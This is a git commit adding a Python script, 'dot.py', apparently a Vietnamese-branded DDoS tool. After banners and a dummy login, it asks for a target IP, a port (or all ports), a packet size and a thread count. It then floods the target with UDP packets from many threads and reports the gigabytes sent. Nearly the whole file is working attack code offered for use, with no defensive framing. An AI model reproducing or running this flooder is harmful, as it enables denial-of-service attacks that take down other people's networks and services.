2350529e731127f0a85c5bac0a1a6813e8bc3f0e
dosw <130276010+sonank077@users.noreply.github.com>
2023-11-26 18:33:03 +0700

    Add files via upload

---
+++ dot.py
@@ -0,0 +1,320 @@
+#AUTHOR SAMP NUDOS
+import random
+import socket
+import threading
+import os
+import sys
+import time
+
+
+###### MESSAGE MIKA ON TOP! #####
+os.system("clear")
+os.system("xdg-open .")
+print("\u001b[24m 𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2 : Chào Bạn Đến Ddos 𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2")
+time.sleep(0)
+print("   ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   10%.")
+print("      ")
+time.sleep(1)
+print("   ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   30%.")
+print("      ")
+time.sleep(0)
+print("   ███████▒▒▒▒▒▒▒▒▒▒▒▒▒▒   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   45%.")
+print("      ")
+time.sleep(1)
+print("   ██████████▒▒▒▒▒▒▒▒▒▒▒   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   50%.")
+print("      ")
+time.sleep(1)
+print("   █████████████▒▒▒▒▒▒▒▒   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   65%.")
+print("      ")
+time.sleep(0)
+print("   █████████████████▒▒▒▒   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   80%.")
+print("      ")
+time.sleep(3)
+print("   █████████████████████   𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.")
+print("   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   100%.")
+print("      ")
+time.sleep(3)
+print("𝙘𝙝Ờㅤ𝙜𝙞Â𝙮ㅤ𝙡Á𝙩ㅤ𝙫À𝙤ㅤ𝙠𝙞𝙢𝙡𝙤𝙣𝙜𝙘2")
+time.sleep(3)
+print("𝘽𝙔ㅤ𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2")
+time.sleep(1)
+os.system("clear")
+print("        ▒░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░      ")
+
+print("        ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░     ")
+
+print("        ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░   ")
+
+print("        ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░   ")
+
+print("        ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░   ")
+
+print("        ▒█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█   ")
+
+print("        ▒█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█   ")
+
+print("        ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░   ")
+
+print("        ░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░   ")
+
+print("        ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░   ")
+
+print("        ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░   ")
+
+print("        ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░   ")
+
+print("        ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░ ")
+time.sleep(1)
+
+
+#### Login       
+
+attemps = 0
+
+while attemps < 100: 
+     
+    username = input(' ⚡ Username: ')
+    password = input(' ⚡ Password: ')
+
+    if username == '' and password == '':
+        print('𝙆𝙄𝙈𝙇𝙊𝙉𝙂 Welcome to xuantruong!!')
+        break
+    else:
+        print('𝙆𝙄𝙈𝙇𝙊𝙉𝙂 .Sài Rồi .')
+        attemps += 1
+        continue
+os.system("clear")
+ 
+ 
+
+print("""
+\u001b[60m
+	  𝘿𝙙𝙤𝙨ㅤ𝙨𝙪𝙥𝙚𝙧 :  𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2
+	  
+	
+⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢾⠱⢕⠠⢀⡀⠀⠀⠀⠀⠀║                       
+⠀⠀⠀⠀⠀⠈⢆⢸⢣⠁⠛⡄⠀⠀⠀⠀║  FB : Xuân Trường      
+⠀⠀⠀⠀⠀⢠⢏⠨⢪⢫⣷⡻⢆⠀⠀⠀║                       
+⠀⠀⠀⠀⣰⣯⢖⠆⠁⠀⣸⡈⠉⠀  ║⠀⠀⠀𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.           
+⠀⠀⠀⠀⡾⣇⡔⡳⠀⢠⢻⢳⣄⡀⠀⠀⠀                      
+⠀⠀⠀⠀⠀⣿⡇⣯⣶⢄⠀⢢⡻⣦⡀⠀⠀                       
+⠀⠀⠀⠀⠀⠘⢿⠼⢸⣋⠀⠀⡍⠻⣿⣦⠀                       
+⠀⠀⠀⠀⠀⠀⠆⡇⢸⡠⣐⠥⡝⠶⠛⢿⠧.                       
+⠀⠀⠀⠀⢀⣠⣼⣧⣼⣷⣁⣒⣡⡴⠀⢸⡆                       
+⠀⠀⠀⣪⠿⠗⠂⠀⠔⠊⠉⠉⠉⠉⢉⢢⠇    [𝘿𝙙𝙤𝙨ㅤ𝙨𝙪𝙥𝙚𝙧 C2].          
+⠀⣠⠮⡷⠶⠿⠿⠭⠤⠤⣕⣲⣶⣶⠾⠋⠀                      
+⠊⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+              ╔════════════════════════════════════╗
+              ║                                    ║
+              ║        𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2.                  ║
+              ║      ───────────────────           ║
+              ║         Fb Xuan Truong             ║
+              ║                                    ║
+              ╚════════════════════════════════════╝
+""")
+
+ 
+nicknm = "𝙆𝙄𝙈𝙇𝙊𝙉𝙂"
+ 
+ 
+from socket import socket, AF_INET, SOCK_DGRAM
+
+from threading import Thread
+from random import choices, randint
+from time import time, sleep
+
+from pystyle import *
+from getpass import getpass as hinput
+
+
+
+class Brutalize:
+
+    def __init__(self, ip, port, force, threads):
+        self.ip = ip
+        self.port = port
+        self.force = force # default: 1250
+        self.threads = threads # default: 100
+
+        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
+        # self.data = self._randbytes()
+        self.data = str.encode("x" * self.force)
+        self.len = len(self.data)
+
+    def flood(self):
+        self.on = True
+        self.sent = 0
+        for _ in range(self.threads):
+            Thread(target=self.send).start()
+        Thread(target=self.info).start()
+    
+    def info(self):
+
+        interval = 0.05
+        now = time()
+
+        size = 0
+        self.total = 0
+
+        bytediff = 8
+        mb = 1000000
+        gb = 1000000000
+        
+
+        while self.on:
+            sleep(interval)
+            if not self.on:
+                break
+
+            if size != 0:
+                self.total += self.sent * bytediff / gb * interval
+                print(stage(f"{fluo}{round(size)} {blue}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {blue}Gb. {' '*20}"), end='\r')
+
+            now2 = time()
+        
+            if now + 1 >= now2:
+                continue
+            
+            size = round(self.sent * bytediff / mb)
+            self.sent = 0
+
+            now += 1
+
+    def stop(self):
+        self.on = False
+
+    def send(self):
+        while self.on:
+            try:
+                self.client.sendto(self.data, self._randaddr())
+                self.sent += self.len
+            except:
+                pass
+    def _randaddr(self):
+        return (self.ip, self._randport())
+
+    def _randport(self):
+        return self.port or randint(1, 65535)
+
+
+
+
+ascii = r'''
+  𝘿𝙙𝙤𝙨ㅤ𝙨𝙪𝙥𝙚𝙧 :  𝙆𝙄𝙈𝙇𝙊𝙉𝙂𝘾2 BY 𝙓𝙪â𝙣ㅤ𝙩𝙧ườ𝙣𝙜                                                        '''
+banner = r""" 𝙆𝙄𝙈𝙇𝙊𝙉𝙂        """.replace('▓', '▀')
+
+
+banner = Add.Add(ascii, banner, center=True)
+
+fluo = Col.light_red
+fluo2 = Col.light_blue
+white = Col.blue
+
+blue = Col.StaticMIX((Col.blue, Col.black))
+bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
+purple = Col.StaticMIX((Col.purple, blue, Col.red))
+
+
+def init():
+    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
+    Cursor.HideCursor()
+
+
+init()
+
+
+def stage(text, symbol = '...'):
+    col1 = purple
+    col2 = white
+    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"
+
+def error(text, start='\n'):
+    hinput(f"{start} {Col.Symbol('!', fluo, blue)} {fluo}{text}")
+    exit()
+
+
+def main():
+    print()
+    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
+
+
+    ip = input(stage(f"IP  {purple}->{fluo2} ", '?'))
+    print()
+
+    try:
+        if ip.count('.') != 3:
+            int('error')
+        int(ip.replace('.',''))
+    except:
+        error("Error! Please enter a correct IP address.")
+
+
+
+    port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{blue} to attack all ports{purple}] {purple}->{fluo2} ", '?'))
+    print()
+
+    if port == '':
+        port = None 
+    else:
+        try:
+            port = int(port)
+            if port not in range(1, 65535 + 1):
+                int('error')
+        except ValueError:
+            error("Error! Please enter a correct port.")
+
+    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
+    print()
+
+    if force == '':
+        force = 1250
+    else:
+        try:
+            force = int(force)
+        except ValueError:
+            error("Error! Please enter an integer.")
+
+
+    threads = input(stage(f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
+    print()
+
+    if threads == '':
+        threads = 100
+    else:
+        try:
+            threads = int(threads)
+        except ValueError:
+            error("Error! Please enter an integer.")
+
+
+    print()
+    cport = '' if port is None else f'{purple}:{fluo2}{port}'
+    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
+
+
+    brute = Brutalize(ip, port, force, threads)
+    try:
+        brute.flood()
+    except:
+        brute.stop()
+        error("A fatal error has occured and the attack was stopped.", '')
+    try:
+        while True:
+            sleep(1000000)
+    except KeyboardInterrupt:
+        brute.stop()
+        print(stage(f"Attack stopped. {fluo2}{ip}{cport}{blue} was Brutalized with {fluo}{round(brute.total, 1)} {blue}Gb.", '.'))
+    print('\n')
+    sleep(1)
+
+    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))
+
+if __name__ == '__main__':
+    main()    
